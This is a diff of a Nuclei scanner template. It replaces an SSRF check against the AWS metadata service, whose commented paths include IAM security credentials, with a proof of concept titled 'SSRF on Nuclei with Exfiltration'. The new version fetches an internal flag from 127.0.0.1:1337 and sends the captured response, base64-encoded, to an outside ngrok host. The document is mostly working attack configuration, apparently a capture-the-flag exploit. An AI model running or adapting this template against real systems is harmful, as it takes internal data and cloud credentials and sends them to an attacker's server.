@@ -1,43 +1,20 @@
-id: SSRF-AWS
+id: ssrf-poc
 
 info:
-  name: SSRF to AWS Metadata Service
-  author: 25
-  severity: high
+  name: SSRF on Nuclei with Exfiltration
+  author: caioluders
+  severity: critical
+  description: Makes internal request, dumps response on the attacker's server
 
 requests:
   - method: GET
     path:
-      # Test multiple common SSRF paths for AWS Metadata Service
-      - "{{BaseURL}}"
-
-    timeout: 10 # Adjust as needed for slow responses
-
-    payloads:
-      injection: 
-        - 'http://169.254.169.254/latest/meta-data/'
-#        - 'http://169.254.169.254/latest/meta-data/hostname'
-#        - 'http://169.254.169.254/latest/meta-data/instance-id'
-#        - 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
-#        - 'http://169.254.169.254/latest/meta-data/placement/availability-zone'
-
-    fuzzing:
-      - part: query
-        type: replace
-        mode: single
-        fuzz:
-          - "{{injection}}"
-
-    # Matchers for identifying AWS metadata responses
-    stop-at-first-match: true
-    matchers-condition: or
-    matchers:
-      - type: word
+      - "http://127.0.0.1:1337/flag"
+      - "http://133713371337.ngrok.io/{{base64(output)}}"
+    extractors:
+      - type: regex
+        name: output
         part: body
-        words:
-          - "compute.internal"         # For EC2 hostname
-          - "instance-id"              # For instance identity
-          - "iam-role"                 # For IAM roles
-          - "availability-zone"        # For region information
-          - "instance-type"
-          - "identity-credentials"
+        internal: true
+        regex:
+          - ".*"
